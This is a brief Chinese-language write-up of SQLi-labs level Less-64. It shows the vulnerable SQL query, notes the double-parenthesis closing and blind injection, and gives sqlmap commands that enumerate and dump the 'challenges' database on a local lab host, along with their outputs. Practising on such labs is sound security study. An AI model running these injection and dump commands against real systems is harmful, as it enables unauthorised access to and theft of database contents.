---
title: less64
url: https://www.yuque.com/u29002979/ep2zrx/gbtp88mubuaqcaoy
---

```bash
$sql="SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1";
```

此关的闭合方式为双括号))，还是盲注的问题

<a name="tTcqx"></a>

# sqlmap

`sqlmap -u http://192.168.31.193/Less-64/?id=1 -D challenges --tables`

> 1wo4hyndr5

`sqlmap -u http://192.168.31.193/Less-64/?id=1 -D challenges -T 1wo4hyndr5 --dump`

> k0Kx2B7urBqzcrJ5uwEoMcEI
